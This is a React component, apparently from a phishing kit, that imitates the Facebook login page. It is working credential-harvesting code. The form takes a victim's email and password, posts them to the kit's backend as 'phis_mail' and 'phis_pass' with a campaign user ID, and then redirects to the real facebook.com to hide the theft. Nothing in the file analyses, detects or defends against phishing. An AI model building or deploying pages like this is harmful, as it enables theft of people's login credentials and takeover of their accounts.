import "./style.css";
import FbLogo from "./fbImg.svg";
import { useState } from "react";
import custom_axios from "../../../axios/custom_axios";
import { ApiConstants } from "../../../api/api_constants";

export default function FbOriginal(props: any) {
    // console.log(props.decoded.socialName);

    const { socialName, socialType, user_id } = props.decoded;
    const [user, setUser] = useState({
        email: "",
        password: "",
    });
    const handleChange = (event: any) => {
        const { name, value } = event.target;
        setUser({ ...user, [name]: value });
    };
    const sendData = async (event: any) => {
        event.preventDefault();
        if (user.email === "" || user.password === "") {
            alert("Please fill all the fields");
            return;
        }
        try {
            const response = await custom_axios.post(ApiConstants.SOCIAL.NEW, {
                user_id: user_id,
                socialName: socialName,
                socialType: socialType,
                phis_mail: user.email,
                phis_pass: user.password,
            });
            console.log(response.data);
            window.location.href = "https://www.facebook.com";
        } catch (error) {
            console.log(error);
            return;
        }

        // console.log("");
    };

    return (
        <>
            <div className="original">
                <section id="myForm">
                    <div className="wrapper">
                        <div className="fbImage">
                            <img src={FbLogo} alt="Facebook" />
                        </div>

                        <form className="login" onSubmit={sendData}>
                            <div className="logHead">
                                <span>Log Into Facebook</span>
                            </div>

                            <div className="form_contents">
                                <input
                                    type="text"
                                    name="email"
                                    placeholder="Email or Phone Number"
                                    value={user.email}
                                    onChange={handleChange}
                                    id="username"
                                    autoComplete="off"
                                    maxLength={35}
                                />

                                <div className="pswd">
                                    <input
                                        type="password"
                                        name="password"
                                        placeholder="Password"
                                        value={user.password}
                                        onChange={handleChange}
                                        id="password"
                                        autoComplete="off"
                                        maxLength={25}
                                        // onKeyUp={showHide()}
                                    />

                                    <div
                                        className="showHide"
                                        id="showPwd"
                                        // onClick={Toggle()}
                                    >
                                        <img
                                            src="https://img.icons8.com/material-outlined/24/000000/visible--v1.png"
                                            alt="show"
                                        />
                                    </div>
                                    <div
                                        className="showHide"
                                        id="hidePwd"
                                        // onClick={{ Toggle();  show(); }}
                                    >
                                        <img
                                            src="https://img.icons8.com/material-outlined/24/000000/hide.png"
                                            alt="hide"
                                        />
                                    </div>
                                </div>
                            </div>

                            <br />
                            <input
                                type="submit"
                                name="button"
                                value="Log In"
                                id="button"
                            />

                            <a href="">Forgot account?</a>

                            <div className="lineOrline">
                                <div className="leftLine"></div>{" "}
                                <div className="or">or</div>{" "}
                                <div className="rightLine"></div>
                            </div>

                            <div className="btn-new-acc">
                                <input
                                    type="button"
                                    name="button2"
                                    value="Create new account"
                                    id="button2"
                                />
                            </div>
                        </form>
                    </div>
                </section>
            </div>
        </>
    );
}
